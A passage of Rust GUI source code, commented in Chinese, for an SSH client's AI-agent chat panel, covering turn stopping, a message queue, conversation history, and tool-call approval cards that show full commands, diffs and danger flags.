        }
        // 窗口关闭时还在后台起的会话：后台任务发现窗口没了，会自己 shutdown（见 start_and_send）。
        // 回合登记随 `Registration` 的 Drop 撤销（`ai_turn = None`），不会一直拦着安装。
        self.ai_turn = None;
        self.clear_host_activity();
    }

    /// 「停止」：真实会话通知驱动停止，并作废桥里在途的工具请求；演示脚本立即作废。
    fn stop(&mut self, cx: &mut Context<Self>) {
        self.stop_turn(false, cx);
    }

    /// 停止当前回合的完整链路。`interrupt`：「打断并发送」用的——停止之后不扣住队列，
    /// 而是等旧回合的收尾事件到了再发；普通「停止」会扣住队列。返回有没有真的停掉一个回合。
    fn stop_turn(&mut self, interrupt: bool, cx: &mut Context<Self>) -> bool {
        let had_turn = if interrupt {
            self.chat.interrupt_for_queue(Instant::now())
        } else {
            self.chat.stop_by_user()
        };
        // 启动中点停止：后台任务不再发第一条消息。
        self.cancel_starting();
        self.sync_ai_turn_count();
        self.sync_host_activity();
        if let Some(session) = self.session.as_ref() {
            // 和 Tauri 版 `ai_agent_abort` 同一条路径：先 `stop_scope` 作废桥里的请求
            // （等审批的按拒绝结束、已发出命令的通道关掉、排队的确认丢掉），再通知驱动。
            session.stop_tools();
            let conversation = Arc::clone(&session.conversation);
            let (bridge, scope_id) = session.interrupt_handle();
            match runtime() {
                Ok(runtime) => {
                    runtime.spawn(async move {
                        // AI-2d 1.4：这个对话**确实**有一条 AI 命令在某个终端里跑，先向那个终端发
                        // Ctrl+C（没有就什么都不发，不会打断用户自己跑的东西），再让智能体停回合。
                        bridge.interrupt_terminal(&scope_id).await;
                        if let Err(err) = conversation.stop().await {
                            tracing::warn!(error = %err, "停止智能体回合失败");
                        }
                    });
                }
                Err(err) => self.footer_error = Some(format!("停止失败：{err}")),
            }
        } else if self.starting {
            // 进程还在起：起来之后立刻关掉。
            self.stop_requested = true;
        }
        if had_turn {
            // 真实对话停了也要留一份：这轮的消息不能因为点了停止就丢掉。
            self.save_history();
            self.scroll.scroll_to_bottom();
            cx.notify();
        }
        had_turn
    }

    /// 输入框里的字加进待发送队列（回合进行中按 Enter）。
    fn enqueue_input(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let text = self.input.read(cx).value().to_string();
        if self.chat.enqueue(&text).is_none() {
            return;
        }
        self.input.update(cx, |state, cx| state.clean(window, cx));
        self.scroll.scroll_to_bottom();
        cx.notify();
    }

    /// 队列删掉一条。
    fn queue_remove(&mut self, id: u64, cx: &mut Context<Self>) {
        if self
            .queue_edit
            .as_ref()
            .is_some_and(|(edit_id, _)| *edit_id == id)
        {
            self.queue_edit = None;
        }
        if self.chat.queue.remove(id) {
            cx.notify();
        }
    }

    /// 开始编辑一条：弹出编辑框，内容是这条现在的文字。
    fn queue_begin_edit(&mut self, id: u64, window: &mut Window, cx: &mut Context<Self>) {
        let Some(text) = self.chat.queue.text_of(id).map(str::to_owned) else {
            return;
        };
        if !self.chat.queue.begin_edit(id) {
            return;
        }
        let state = cx.new(|cx| TextareaState::new(window, cx).auto_grow(1, 4));
        state.update(cx, |state, cx| state.set_value(text, window, cx));
        self.queue_edit = Some((id, state));
        cx.notify();
    }

    /// 保存编辑（空白 = 删除这条）。
    fn queue_save_edit(&mut self, cx: &mut Context<Self>) {
        if let Some((id, state)) = self.queue_edit.take() {
            let text = state.read(cx).value().to_string();
            self.chat.queue.edit(id, &text);
            cx.notify();
        }
    }

    /// 不保存地放弃编辑。
    fn queue_cancel_edit(&mut self, cx: &mut Context<Self>) {
        self.queue_edit = None;
        self.chat.queue.cancel_edit();
        cx.notify();
    }

    /// 「打断并发送」：走现有停止链结束当前回合，旧回合收尾后立刻发队列。
    /// 会话还在后台起的时候不提供（没有回合可打断，停止只会让会话起来就被关掉）。
    fn interrupt_and_send(&mut self, cx: &mut Context<Self>) {
        if !self.real || self.session.is_none() || !self.chat.queue_can_interrupt() {
            return;
        }
        self.stop_turn(true, cx);
        cx.notify();
    }

    /// 用户点了停止后，队列留着没发：「现在发送」。
    fn queue_send_now(&mut self, cx: &mut Context<Self>) {
        self.chat.queue.release();
        // 正在编辑的先按已保存的内容算（放弃没存的改动），免得点了发送却什么也没发。
        if self.queue_edit.take().is_some() {
            self.chat.queue.cancel_edit();
        }
        cx.notify();
    }

    /// 回合进行中输入框的占位文字换成「Enter 加入待发送队列」，结束后换回来。返回有没有改。
    fn sync_input_placeholder(&mut self, window: &mut Window, cx: &mut Context<Self>) -> bool {
        let queueing = self.real && self.chat.is_running();
        if queueing == self.placeholder_queueing {
            return false;
        }
        self.placeholder_queueing = queueing;
        let text = if queueing {
            INPUT_PLACEHOLDER_RUNNING
        } else {
            INPUT_PLACEHOLDER
        };
        self.input
            .update(cx, |state, cx| state.set_placeholder(text, window, cx));
        true
    }

    /// 节拍里调用：队列该发就发。发不出去（智能体不可用）放回队首并扣住。
    fn flush_queue(&mut self, window: &mut Window, cx: &mut Context<Self>) -> bool {
        if !self.real {
            return false;
        }
        let Some(text) = self.chat.take_queue_to_send(Instant::now()) else {
            return false;
        };
        if self.history != HistoryPanel::Closed {
            self.close_history();
        }
        if let Some(reason) = self.blocked_reason().or_else(|| self.anchor_gate()) {
            self.chat.queue.put_back(&text);
            self.footer_error = Some(reason);
            return true;
        }
        self.send_real_with(text, false, window, cx);
        true
    }

    /// 「新对话」：关掉真实会话并清空消息；演示脚本一起取消。
    fn new_conversation(&mut self, cx: &mut Context<Self>) {
        self.end_current_conversation(cx);
        // 新对话不接旧会话：点过「继续」但还没发送的续接 id 一起丢掉。
        self.pending_resume = None;
        self.resume_notice = None;
        // 新对话另起一条历史：下一次发送重新分配 id，不覆盖上一个对话的文件。
        self.history_id = None;
        self.history_save = None;
        self.link_notice = None;
        self.shown_messages = MESSAGES_PER_PAGE;
        self.close_history();
        self.queue_edit = None;
        self.chat.new_conversation();
        // 新对话回到未锁定：目标栏重新跟着当前聚焦窗格，`@` 的主机清空。
        self.reset_anchor();
        self.sync_ai_turn_count();
        self.sync_host_activity();
        self.footer_error = None;
        self.scroll.scroll_to_bottom();
        cx.notify();
    }

    /// 「Markdown 示例」：追加一条静态助手消息，只走本地渲染，不碰脚本和模型。
    fn append_markdown_sample(&mut self, cx: &mut Context<Self>) {
        self.chat
            .messages
            .push(ChatMessage::Assistant(AssistantMessage {
                text: MARKDOWN_SAMPLE.to_owned(),
                ..AssistantMessage::default()
            }));
        // 不碰 `active`：正在跑的回合继续写它自己的那条消息。
        self.scroll.scroll_to_bottom();
        cx.notify();
    }

    /// 「历史」：开 / 关面板；打开时刷新列表（本地扫描，不碰网络）。
    fn toggle_history(&mut self, cx: &mut Context<Self>) {
        if self.history == HistoryPanel::Closed {
            self.history = HistoryPanel::List;
            self.history_armed = None;
            self.refresh_history();
        } else {
            self.close_history();
        }
        cx.notify();
    }

    /// 关面板（「历史」按钮 / 关闭 / 继续之后都走这里）。
    fn close_history(&mut self) {
        self.history = HistoryPanel::Closed;
        self.history_armed = None;
    }

    /// 重新读当前智能体的历史列表；读失败时保留 `HistoryError` 的文字给面板。
    fn refresh_history(&mut self) {
        match load_history_rows(self.agent) {
            Ok(rows) => {
                self.history_rows = rows;
                self.history_error = None;
            }
            Err(err) => {
                self.history_rows.clear();
                self.history_error = Some(format!("读取历史失败：{err}"));
            }
        }
    }

    /// 「查看」：读整条历史，只读显示在面板里。
    fn open_history(&mut self, id: &str, cx: &mut Context<Self>) {
        self.history_armed = None;
        match load_history_record(self.agent, id) {
            Ok(record) => {
                self.history = HistoryPanel::Detail(Box::new(record));
                self.history_error = None;
                self.history_shown = MESSAGES_PER_PAGE;
                self.history_full.clear();
            }
            Err(err) => {
                self.history = HistoryPanel::List;
                self.history_error = Some(format!("打开历史会话失败：{err}"));
            }
        }
        cx.notify();
    }

    /// 「删除」：第一下只武装确认，第二下才真删；同一时间只允许一行。
    fn delete_history(&mut self, id: &str, cx: &mut Context<Self>) {
        if self.history_armed.as_deref() != Some(id) {
            self.history_armed = Some(id.to_owned());
            cx.notify();
            return;
        }
        match delete_history_record(self.agent, id) {
            Ok(()) => {
                self.history_armed = None;
                self.history_error = None;
                self.refresh_history();
                if matches!(&self.history, HistoryPanel::Detail(record) if record.id.as_str() == id)
                {
                    self.history = HistoryPanel::List;
                }
            }
            Err(err) => {
                self.history_armed = None;
                self.history_error = Some(format!("删除历史会话失败：{err}"));
            }
        }
        cx.notify();
    }

    /// 「取消」：撤掉删除确认。
    fn disarm_history_delete(&mut self, cx: &mut Context<Self>) {
        if self.history_armed.take().is_some() {
            cx.notify();
        }
    }

    /// 「继续」：先结束当前对话，把那条历史的消息放回对话区、历史 id 换成它的，
    /// 记住智能体会话 id，下一次懒启动时接上（Claude Code 用 `--resume`，别的用各自的续接）。
    ///
    /// 旧版不清当前对话也不换 id，续接后的消息会连同屏幕上原来的对话一起写进**原来那条**
    /// 历史文件，把两个对话写串（审查 H4）。
    fn continue_history(&mut self, id: &str, cx: &mut Context<Self>) {
        let record = match load_history_record(self.agent, id) {
            Ok(record) => record,
            Err(err) => {
                self.history = HistoryPanel::List;
                self.history_error = Some(format!("打开历史会话失败：{err}"));
                cx.notify();
                return;
            }
        };
        // 先确认能续接（有智能体会话标识），再动当前对话。
        if let Err(err) = resume_session_id(&record) {
            self.footer_error = Some(err);
            cx.notify();
            return;
        }
        // 当前对话还在跑：先停掉并留一份（用旧的历史 id），再换成要继续的那条。
        if self.chat.is_running() {
            self.stop(cx);
        }
        self.end_current_conversation(cx);
        if let Err(err) = continue_conversation(
            &mut self.chat,
            &mut self.history_id,
            &mut self.pending_resume,
            &record,
        ) {
            self.footer_error = Some(err);
            cx.notify();
            return;
        }
        self.history_save = None;
        self.link_notice = None;
        self.shown_messages = MESSAGES_PER_PAGE;
        // 回到它当初锚定的主机（旧历史没有锚定就保持未锁定）。
        self.restore_anchor(record.anchor.as_ref());
        self.sync_ai_turn_count();
        self.sync_host_activity();
        self.real = true;
        self.close_history();
        self.footer_error = None;
        self.resume_notice = Some(HISTORY_RESUME_SELECTED.to_owned());
        self.scroll.scroll_to_bottom();
        cx.notify();
    }

    /// 「真实 Claude」/「离线演示」：在两种模式之间切换。只有调试版有这个入口。
    fn toggle_real(&mut self, cx: &mut Context<Self>) {
        if !demo_toggle_available() {
            return;
        }
        if self.real {
            // 回离线：先把真实会话关掉，别在后台留进程。
            self.end_current_conversation(cx);
            // 续接是真实模式的事：回离线之后不能再拿旧 id 起进程。
            self.pending_resume = None;
            self.resume_notice = None;
            self.chat.stop();
            self.sync_ai_turn_count();
            self.sync_host_activity();
            self.real = false;
        } else {
            self.real = true;
            self.footer_error = None;
        }
        cx.notify();
    }

    /// 点一台主机：加进目标或从目标里去掉；已有会话就马上同步给桥。
    fn toggle_host(&mut self, id: i64, cx: &mut Context<Self>) {
        toggle_host_selection(&mut self.selected_hosts, id);
        let targets = self.selected_targets();
        if let Some(session) = self.session.as_ref() {
            session.sync_hosts(&targets);
        }
        self.sync_host_activity();
        cx.notify();
    }

    fn cycle_model(&mut self, cx: &mut Context<Self>) {
        self.model_index = next_model_index(self.models.len(), self.model_index);
        cx.notify();
    }

    /// 当前选中的模型 id；「默认」是 `None`。
    fn selected_model(&self) -> Option<String> {
        // 主窗口里的面板：模型和强度是两个选择，发的是它们拼出来的平铺 id。
        if let Some(embed) = &self.embed {
            return embed.model_for_send();
        }
        self.models
            .get(self.model_index)
            .and_then(|model| model.id.clone())
    }

    /// 「执行模式」：按逐条确认 → 只读自动 → 全部放行循环。
    ///
    /// 真实模式写回设置库（工具桥每次执行前读它）；离线演示只改内存里的 `demo_mode`，
    /// 不碰设置库。
    fn cycle_mode(&mut self, cx: &mut Context<Self>) {
        let (next, persist) = next_mode_plan(self.real, self.current_mode());
        if persist {
            match self.write_mode(next) {
                Ok(()) => self.settings_error = None,
                Err(err) => self.settings_error = Some(err),
            }
            // 保存失败也先让本窗口按新模式显示，底部会说明没有保存成功。
            self.mode = next;
        } else {
            self.demo_mode = next;
        }
        cx.notify();
    }

    fn write_mode(&self, mode: ExecMode) -> Result<(), String> {
        match &self.db {
            Some(db) => save_exec_mode(db, mode),
            None => Err(format!(
                "设置库不可用：{}；执行模式不会保存。",
                self.storage_error.as_deref().unwrap_or("打开失败")
            )),
        }
    }

    /// 确认/拒绝一个待确认工具；真实确认回填给宿主，演示确认推进脚本。
    fn answer_approval(&mut self, call_id: &str, allow: bool, cx: &mut Context<Self>) {
        let changed = if let Some(id) = self.chat.real_approval(call_id) {
            let live = self
                .session
                .as_ref()
                .is_some_and(|session| session.resolve_approval(id, allow));
            self.chat.resolve_real_approval(call_id, allow, live)
        } else {
            self.chat.resolve_approval(call_id, allow)
        };
        if changed {
            self.scroll.scroll_to_bottom();
            cx.notify();
        }
    }

    /// 点了 Markdown 链接。所有链接 handler（渲染、原文、历史）都走这里：校验后只复制网址。
    fn open_link(&mut self, raw: &str, cx: &mut Context<Self>) {
        let (notice, copy) = link_click_notice(raw);
        if let Some(url) = copy {
            cx.write_to_clipboard(ClipboardItem::new_string(url));
        }
        self.link_notice = Some(notice);
        cx.notify();
    }

    /// 复制一段文字（命令全文等）。
    fn copy_text(&mut self, text: String, cx: &mut Context<Self>) {
        cx.write_to_clipboard(ClipboardItem::new_string(text));
    }

    /// 助手正文：渲染模式保留 Markdown 视图；原文模式把原始 Markdown 放进代码块。
    ///
    /// 两种模式的链接都挂同一个 handler（[`Self::open_link`]：core 的 `validate_external_url`
    /// 校验，通过只复制网址、不打开浏览器，和 0.2.14 一致）。原文模式的围栏按正文里最长的
    /// 反引号串现算，正文逃不出代码块；handler 是第二道防线。
    fn assistant_body(
        &self,
        entity: Entity<Self>,
        index: usize,
        message: &AssistantMessage,
        mode: BodyMode,
    ) -> Option<AnyElement> {
        let source = body_markdown(message, mode)?;
        let id = match mode {
            BodyMode::Rendered => ("agent-chat-markdown", index),
            BodyMode::Raw => ("agent-chat-raw", index),
        };
        let link_entity = entity.clone();
        let view = TextView::markdown(id, source)
            .text_sm()
            .selectable(true)
            .selection_format(SelectionFormat::Source)
            // 所有图片都换成不存在的内嵌资源：既不读远端，也不读本地文件。
            .image_source(|_| {
                ImageSource::Resource(Resource::Embedded("zssh-no-remote-images".into()))
            })
            .on_link_click(move |url, event, _, cx| {
                if !link_click_opens(event) {
                    return;
                }
                let url = url.to_string();
                link_entity.update(cx, |this, cx| this.open_link(&url, cx));
            })
            .code_block_actions(move |code_block, _, _| {
                let code = code_block_copy_text(&code_block.code());
                Button::new(format!("agent-chat-copy-code-{index}"))
                    .label("复制")
                    .compact()
                    .on_click(move |_, _, cx| {
                        cx.write_to_clipboard(ClipboardItem::new_string(code.clone()));
                    })
            })
            .table_actions(move |table, _, _| {
                let tsv = table_tsv(&table.headers, &table.rows);
                h_flex().justify_end().child(
                    Button::new(format!("agent-chat-copy-table-{index}"))
                        .label("复制表格")
                        .compact()
                        .on_click(move |_, _, cx| {
                            cx.write_to_clipboard(ClipboardItem::new_string(tsv.clone()));
                        }),
                )
            });
        let (_, clipped) = clipped_body(&message.text, message.body_expanded);
        let total_chars = message.text.chars().count();
        let expanded = message.body_expanded;
        if !clipped && !(expanded && total_chars > BODY_PREVIEW_CHARS) {
            return Some(view.into_any_element());
        }
        let toggle_entity = entity;
        Some(
            v_flex()
                .gap_1()
                .child(view)
                .child(
                    h_flex()
                        .gap_2()
                        .items_center()
                        .child(
                            div()
                                .text_xs()
                                .child(if expanded {
                                    format!("正文很长（{total_chars} 个字符），已全部显示。")
                                } else {
                                    format!(
                                        "正文很长（{total_chars} 个字符），只渲染了前 {BODY_PREVIEW_CHARS} 个。"
                                    )
                                }),
                        )
                        .child(
                            Button::new(format!("agent-chat-body-more-{index}"))
                                .label(if expanded { "收起" } else { "展开全文" })
                                .compact()
                                .on_click(move |_, _, cx| {
                                    toggle_entity.update(cx, |this, cx| {
                                        this.chat.toggle_body_expanded(index);
                                        cx.notify();
                                    });
                                }),
                        ),
                )
                .into_any_element(),
        )
    }

    /// 一个等宽的文本框：默认限高滚动，超长时旁边有「展开全文」；展开后不限高。
    /// 命令、文件路径都用它显示全文（换行保留，不可见控制字符已被转义成可见形式）。
    fn text_box(id: String, text: String, expanded: bool, danger: bool, cx: &App) -> AnyElement {
        div()
            .id(id)
            .w_full()
            .p_2()
            .rounded_sm()
            .border_1()
            .border_color(if danger {
                cx.theme().danger
            } else {
                cx.theme().border
            })
            .bg(cx.theme().background)
            .text_xs()
            .when(!expanded, |boxed| {
                boxed.max_h(::gpui::px(160.0)).overflow_y_scroll()
            })
            .child(text)
            .into_any_element()
    }

    /// 命令框 + 「展开全文 / 收起」「复制」按钮。
    #[allow(clippy::too_many_arguments)]
    fn command_block(
        &self,
        id: &str,
        text: String,
        expanded: bool,
        danger: bool,
        entity: Entity<Self>,
        message_index: usize,
        tool_index: usize,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let long = needs_expand(&text);
        let line_count = text.lines().count().max(1);
        let copy_text = text.clone();
        let toggle_entity = entity.clone();
        let copy_entity = entity;
        v_flex()
            .gap_1()
            .child(Self::text_box(
                format!("{id}-text"),
                text,
                expanded,
                danger,
                cx,
            ))
            .child(
                h_flex()
                    .gap_2()
                    .items_center()
                    .when(long, |row| {
                        row.child(
                            Button::new(format!("{id}-expand"))
                                .label(if expanded {
                                    "收起".to_owned()
                                } else {
                                    format!("展开全文（{line_count} 行）")
                                })
                                .compact()
                                .on_click(move |_, _, cx| {
                                    toggle_entity.update(cx, |this, cx| {
                                        this.chat
                                            .toggle_command_expanded(message_index, tool_index);
                                        cx.notify();
                                    });
                                }),
                        )
                    })
                    .child(
                        Button::new(format!("{id}-copy"))
                            .label("复制")
                            .compact()
                            .on_click(move |_, _, cx| {
                                copy_entity.update(cx, |this, cx| {
                                    this.copy_text(copy_text.clone(), cx);
                                });
                            }),
                    ),
            )
            .into_any_element()
    }

    /// 确认请求的细节：主机、危险标记和原因、命令全文，或者文件路径和差异。
    /// 回答之后也留着，回看时能确认当时批准的是什么。
    fn approval_detail_view(
        &self,
        message_index: usize,
        tool_index: usize,
        detail: &ApprovalDetail,
        entity: Entity<Self>,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let request = &detail.request;
        let danger = detail.dangerous();
        let base = format!("agent-chat-approval-{message_index}-{tool_index}");
        let mut view = v_flex().gap_1();
        view = view.child(
            h_flex().gap_2().items_center().child(
                div()
                    .text_xs()
                    .text_color(cx.theme().muted_foreground)
                    .child(format!("主机：{}", redact_paths(&request.host_label))),
            ),
        );
        if !request.reasons.is_empty() {
            view = view.child(
                div()
                    .text_xs()
                    .font_weight(FontWeight::SEMIBOLD)
                    .text_color(cx.theme().danger)
                    .child(request.reasons.join("；")),
            );
        }
        if let Some(command) = detail.command_text() {
            view = view.child(self.command_block(
                &format!("{base}-command"),
                command,
                detail.command_expanded,
                danger,
                entity.clone(),
                message_index,
                tool_index,
                cx,
            ));
        }
        if let Some(file) = &request.file {
            let total = file.diff.lines.len();
            let (shown, hidden) = fold_diff(total, detail.diff_expanded);
            let diff_entity = entity.clone();
            let fold_entity = entity;
            view = view
                .child(Self::text_box(
                    format!("{base}-path"),
                    visible_command_text(&file.path),
                    true,
                    danger,
                    cx,
                ))
                .child(
                    h_flex()
                        .gap_2()
                        .child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().muted_foreground)
                                .child(diff_summary(
                                    file.diff.added,
                                    file.diff.removed,
                                    file.diff.is_new,
                                )),
                        )
                        .child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().muted_foreground)
                                .child(if file.is_new {
                                    "新建"
                                } else {
                                    "覆盖前自动备份"
                                }),
                        ),
                );
            let lines: Vec<AnyElement> = file
                .diff
                .lines
                .iter()
                .take(shown)
                .map(|line| {
                    let (prefix, color) = match line.kind.as_str() {
                        "add" => ("+ ", cx.theme().success),
                        "del" => ("- ", cx.theme().danger),
                        "hunk" => ("", cx.theme().muted_foreground),
                        _ => ("  ", cx.theme().foreground),
                    };
                    div()
                        .text_xs()
                        .text_color(color)
                        .child(format!("{prefix}{}", visible_command_text(&line.text)))
                        .into_any_element()
                })
                .collect();
            view = view.child(
                v_flex()
                    .id(format!("{base}-diff"))
                    .w_full()
                    .p_2()
                    .rounded_sm()
                    .border_1()
                    .border_color(cx.theme().border)
                    .bg(cx.theme().background)
                    .max_h(::gpui::px(260.0))
                    .overflow_y_scroll()
                    .children(lines),
            );
            if hidden > 0 {
                view = view.child(
                    Button::new(format!("{base}-diff-more"))
                        .label(format!("还有 {hidden} 行，点击展开"))
                        .compact()
                        .on_click(move |_, _, cx| {
                            diff_entity.update(cx, |this, cx| {
                                this.chat.toggle_diff_expanded(message_index, tool_index);
                                cx.notify();
                            });
                        }),
                );
            } else if detail.diff_expanded && total > crate::agent_text::DIFF_FOLD_LIMIT {
                view = view.child(
                    Button::new(format!("{base}-diff-less"))
                        .label("收起")
                        .compact()
                        .on_click(move |_, _, cx| {
                            fold_entity.update(cx, |this, cx| {
                                this.chat.toggle_diff_expanded(message_index, tool_index);
                                cx.notify();
                            });
                        }),
                );
            }
            if file.diff.omitted_lines > 0 {
                view = view.child(
                    div()
                        .text_xs()
                        .text_color(cx.theme().muted_foreground)
                        .child(format!(
                            "差异太长，后面还有 {} 行没有显示",
                            file.diff.omitted_lines
                        )),
                );
            }
        }
        view.into_any_element()
    }

    fn tool_card(
        &self,
        message_index: usize,
        tool_index: usize,
        card: &ToolCard,
        entity: Entity<Self>,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let allow_entity = entity.clone();
        let deny_entity = entity.clone();
        let output_entity = entity.clone();
        let more_entity = entity.clone();
        let allow_call = card.call_id.clone();
        let deny_call = card.call_id.clone();
        let status_color = match card.status {
            ToolStatus::Done | ToolStatus::Answered => cx.theme().success,
            ToolStatus::Failed | ToolStatus::Stopped => cx.theme().danger,
            ToolStatus::AwaitingApproval => cx.theme().warning,
            ToolStatus::Running => cx.theme().muted_foreground,
        };
        let output_id = format!("agent-chat-output-{message_index}-{tool_index}");
        let dangerous = card.dangerous();
        // 执行层回报的实际执行位置：对话里有多个目标（或当时没有「当前」）时必须标明在哪台主机执行。
        let exec_label = card
            .exec
            .as_ref()
            .filter(|_| card.exec_multi || self.selected_hosts.len() > 1)
            .map(|exec| redact_paths(&exec.label));
        let target_unknown = self.chat.target_unknown(card);
        let view_exec = card.exec.clone().filter(|_| self.embed.is_some());
        let view_entity = entity.clone();
        let status_text = card_status_text(card);

        let mut element = v_flex()
            .gap_1()
            .p_2()
            .rounded_md()
            .border_1()
            .border_color(if card.error.is_some() || dangerous {
                cx.theme().danger
            } else {
                cx.theme().border
            })
            .bg(cx.theme().tab_bar)
            .child(
                h_flex()
                    .gap_2()
                    .items_center()
                    .child(
                        div()
                            .text_sm()
                            .font_weight(FontWeight::SEMIBOLD)
                            .child(agent_tools::friendly_tool_name(&card.tool)),
                    )
                    .when_some(exec_label, |row, label| {
                        row.child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().muted_foreground)
                                .child(label),
                        )
                    })
                    .when(target_unknown, |row| {
                        row.child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().warning)
                                .child("执行目标未确定"),
                        )
                    })
                    .when_some(view_exec, |row, exec| {
                        row.child(
                            Button::new(format!(
                                "agent-chat-view-terminal-{message_index}-{tool_index}"
                            ))
                            .label("查看终端")
                            .compact()
                            .on_click(move |_, _, cx| {
                                view_entity.update(cx, |this, cx| this.view_terminal(&exec, cx));
                            }),
                        )
                    })
                    .when(dangerous, |row| {
                        row.child(
                            div()
                                .px_1()
                                .rounded_sm()
                                .bg(cx.theme().danger)
                                .text_xs()
                                .text_color(cx.theme().background)
                                .child("危险"),
                        )
                    })
                    .child(div().text_xs().text_color(status_color).child(status_text))
                    .child(div().flex_1())
                    .when(card.output.is_some(), |row| {
                        row.child(
                            div()
                                .id(output_id)
                                .cursor_pointer()
                                .text_xs()
                                .text_color(cx.theme().muted_foreground)
                                .child(if card.output_expanded {
                                    "输出 ▾"
                                } else {
                                    "输出 ▸"
                                })
                                .on_click(move |_, _, cx| {
                                    output_entity.update(cx, |this, cx| {
                                        this.chat.toggle_tool_output(message_index, tool_index);
                                        cx.notify();
                                    });
                                }),
                        )
                    }),
            );

        if let Some(detail) = &card.detail {
            element = element.child(self.approval_detail_view(
                message_index,
                tool_index,
                detail,
                entity.clone(),
                cx,
            ));
        } else if let Some(command) = card.input.command() {
            // 没有确认请求的命令卡片（自动模式、驱动上报的调用）也显示命令全文，
            // 不再只给一行被截断的摘要。
            element = element.child(self.command_block(
                &format!("agent-chat-call-{message_index}-{tool_index}"),
                visible_command_text(&command),
                card.command_expanded,
                dangerous,
                entity.clone(),
                message_index,
                tool_index,
                cx,
            ));
        } else if agent_tools::is_file_tool(&card.tool)
            && let Some(path) = agent_tools::path_of(&card.input_json())
        {
            // 文件工具：路径全文（服务器上的路径），不是一行被截断的 JSON 摘要。
            element = element.child(Self::text_box(
                format!("agent-chat-path-{message_index}-{tool_index}"),
                visible_command_text(&path),
                true,
                false,
                cx,
            ));
        } else {
            element = element.child(
                div()
                    .text_xs()
                    .text_color(cx.theme().muted_foreground)
                    .child(redact_paths(&card.input.summary())),
            );
        }

        // 结果里的细节（0.2.14 `ToolCard`）：写系统路径标红、原文件备份到哪儿、属主没能改回去、
        // 命令在终端里还是后台执行的。
        for (line, danger) in card_detail_lines(card) {
            element = element.child(div().text_xs().child(line).text_color(if danger {
                cx.theme().danger
            } else {
                cx.theme().muted_foreground
            }));
        }

        if card.approval == ApprovalState::Pending {
            element = element.child(
                v_flex()
                    .gap_1()
                    .p_2()
                    .rounded_sm()
                    .border_1()
                    .border_color(cx.theme().warning)
                    .bg(cx.theme().muted)
                    .child(
                        div()
                            .text_sm()
                            .font_weight(FontWeight::SEMIBOLD)
                            .text_color(cx.theme().warning)
                            .child("需要确认：请看清上面的完整内容再决定"),
                    )
                    .child(
                        h_flex()
                            .gap_2()
                            .items_center()
                            .child(
                                Button::new(format!(
                                    "agent-chat-allow-{message_index}-{tool_index}"
                                ))
                                .label("允许")
                                .compact()
                                .on_click(move |_, _, cx| {
                                    allow_entity.update(cx, |this, cx| {
                                        this.answer_approval(&allow_call, true, cx);
                                    });
                                }),
                            )
                            .child(
                                Button::new(format!(
                                    "agent-chat-deny-{message_index}-{tool_index}"
                                ))
                                .label("拒绝")
                                .compact()
                                .on_click(move |_, _, cx| {
                                    deny_entity.update(cx, |this, cx| {
                                        this.answer_approval(&deny_call, false, cx);
                                    });
                                }),
                            ),
                    ),
            );
        } else if card.approval == ApprovalState::Allowed {
            element = element.child(
                div()
                    .text_xs()
                    .text_color(cx.theme().success)
                    .child("已允许"),
            );
        } else if card.approval == ApprovalState::Denied {
            element = element.child(
                div()
                    .text_xs()
                    .text_color(cx.theme().danger)
                    .child("已拒绝"),
            );
        }

        if let Some(error) = &card.error {
            element = element.child(
                div()
                    .text_xs()
                    .text_color(cx.theme().danger)
                    .child(format!("错误：{}", redact_paths(error))),
            );
        }

        if let Some(output) = &card.output
            && card.output_expanded
        {
            // 有的智能体把 MCP 结果原样包成 JSON 字符串：拆开再显示。
            let output = &agent_tools::readable_output(output);
            let clip = clip_text(output, OUTPUT_PREVIEW_LINES, OUTPUT_PREVIEW_CHARS);
            let shown = if card.output_full {
                output.clone()
            } else {
                clip.text.clone()
            };
            let long = clip.clipped;
            element = element.child(
                div()
                    .id(format!(
                        "agent-chat-output-text-{message_index}-{tool_index}"
                    ))
                    .p_2()
                    .rounded_sm()
                    .border_1()
                    .border_color(cx.theme().border)
                    .bg(cx.theme().background)
                    .text_xs()
                    .when(card.output_full, |boxed| {
                        boxed.max_h(::gpui::px(320.0)).overflow_y_scroll()
                    })
                    .child(shown),
            );
            if long {
                let full = card.output_full;
                element = element.child(
                    h_flex()
                        .gap_2()
                        .items_center()
                        .child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().muted_foreground)
                                .child(if full {
                                    format!("已显示全部 {} 行", clip.total_lines)
                                } else {
                                    format!(
                                        "输出较长，只显示前面一部分（共 {} 行、{} 个字符）",
                                        clip.total_lines, clip.total_chars
                                    )
                                }),
                        )
                        .child(
                            Button::new(format!(
                                "agent-chat-output-more-{message_index}-{tool_index}"
                            ))
                            .label(if full { "收起" } else { "显示全部" })
                            .compact()
                            .on_click(move |_, _, cx| {
                                more_entity.update(cx, |this, cx| {
                                    this.chat.toggle_output_full(message_index, tool_index);
                                    cx.notify();
                                });
                            }),
                        ),
                );
            }
        }

        element.into_any_element()
    }

    /// 一组已经执行完的工具调用：一行淡色小字，默认收起，点开显示完整卡片；有失败的用警示色并写明几条失败。
    fn tool_group(
        &self,
        message_index: usize,
        message: &AssistantMessage,
        ids: &[usize],
        entity: Entity<Self>,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let first = ids.first().copied().unwrap_or(0);
        let open = message.open_groups.contains(&first);
        // 确认卡片不计数：命令的结果在另一张工具卡片上，一条命令不能算两次。
        let counted: Vec<&ToolCard> = ids
            .iter()
            .map(|index| &message.tools[*index])
            .filter(|card| !card.is_approval())
            .collect();
        let tools: Vec<&str> = counted.iter().map(|card| card.tool.as_str()).collect();
        let failed = counted.iter().filter(|card| card.view().failed).count();
        let mut summary = if tools.is_empty() {
            format!("{} 条已处理的确认", ids.len())
        } else {
            agent_tools::summarize_calls(&tools)
        };
        if failed > 0 {
            summary.push_str(&format!("（其中 {failed} 条失败）"));
        }
        let toggle_entity = entity.clone();
        let mut group = v_flex().w_full().gap_1().child(
            h_flex()
                .id(("agent-chat-tool-group", message_index * 1000 + first))
                .w_full()
                .cursor_pointer()
                .gap_1()
                .items_center()
                .child(
                    div()
                        // 摘要比面板宽时折行，不被截断。
                        .flex_1()
                        .min_w_0()
                        .text_xs()
                        .text_color(if failed > 0 {
